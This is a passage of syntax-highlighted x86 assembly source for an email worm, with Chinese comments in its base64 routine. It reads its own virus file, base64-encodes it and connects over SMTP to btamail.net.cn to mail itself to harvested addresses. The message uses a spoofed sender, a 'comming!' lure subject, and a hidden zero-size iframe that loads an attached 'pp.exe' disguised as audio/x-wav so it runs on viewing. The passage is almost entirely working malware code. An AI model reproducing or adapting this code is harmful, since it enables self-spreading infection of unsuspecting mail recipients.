    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLRead</span><span class="sc4">],</span><span class="sc5">hVirFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3000h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">MakeMailFileEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AnsiToBase64</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc5">hEmlFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">0a0d0a0dh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc5">hEmlFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">MakeMailFileEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">OldEsp</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">MakeMailFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SmtpSendMail</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">eMail</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">hVirFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">OldEsp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">RetVal</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldEsp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">RetVal</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.WsWSAStartup</span><span class="sc4">],</span><span class="sc2">101h</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SendMailQuit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wssocket</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc4">,</span><span class="sc5">SOCK_STREAM</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ClearSocket</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.sin_family</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wshtons</span><span class="sc4">],</span><span class="sc2">25</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.sin_port</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushSmtpSrvr</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'btamail.net.cn'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushSmtpSrvr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wsgethostbyname</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseSocket</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.h_ip</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.sin_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wsconnect</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">SOCKADDR</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseSocket</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FormatMailHeader</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">eMail</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wssend</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">4000</span><span class="sc0">
    
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLRead</span><span class="sc4">],</span><span class="sc5">hVirFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3000h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseSocket</span><span class="sc0">
    
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AnsiToBase64</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wssend</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">4000</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMailEnd</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">PushMailEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wssend</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">4000</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMailQuit</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">PushMailQuit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wssend</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">4000</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">RetVal</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">CloseSocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Wsclosesocket</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">ClearSocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.WsWSACleanup</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SendMailQuit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">OldEsp</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RetVal</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SmtpSendMail</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FormatMailHeader</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">MailHeader</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">eMail</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">MailHeaderLong</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetComputerNameA</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMailData</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'HELO btamail.net.cn'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MAIL FROM: imissyou@btamail.net.cn'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RCPT TO: %s'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FROM: %s@yahoo.com'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TO: %s'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SUBJECT: %s is comming!'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">          
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-type: multipart/mixed; boundary="#BOUNDARY#"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--#BOUNDARY#'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: text/html'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: quoted-printable'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'&lt;html&gt;&lt;HEAD&gt;&lt;/HEAD&gt;&lt;body bgColor=3D#ffffff&gt;&lt;iframe src=3Dcid:THE-CID height=3D0 width=3D0&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--#BOUNDARY#'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">  
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: audio/x-wav; name="pp.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-id: THE-CID'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushMailData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.UserwsprintfA</span><span class="sc4">],</span><span class="sc5">MailHeader</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">eMail</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">eMail</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">MailHeaderLong</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MailHeaderLong</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FormatMailHeader</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">AnsiToBase64</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">AnsiBuff</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">AnsiSize</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">Base64Buff</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">nBase64Size</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">nBase64Size</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetBase64Char</span><span class="sc0">
    </span><span class="sc5">Base64Char</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'abcdefghijklmnopqrstuvwxyz'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'0123456789+/'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetBase64Char</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;esi=Offset Base64Char</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Base64Buff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">AnsiSize</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;计算总位数   </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;存索引</span><span class="sc0">
</span><span class="sc5">ContTurn</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;存数值</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">ContGetBit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetBit</span><span class="sc4">,</span><span class="sc5">AnsiBuff</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> 
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetBitOver</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContGetBit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">nBase64Size</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContTurn</span><span class="sc0">
</span><span class="sc5">GetBitOver</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">nBase64Size</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">nBase64Size</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'='</span><span class="sc0"> </span><span class="sc1">;位数不够添“=”号，一个等号代表两位0</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
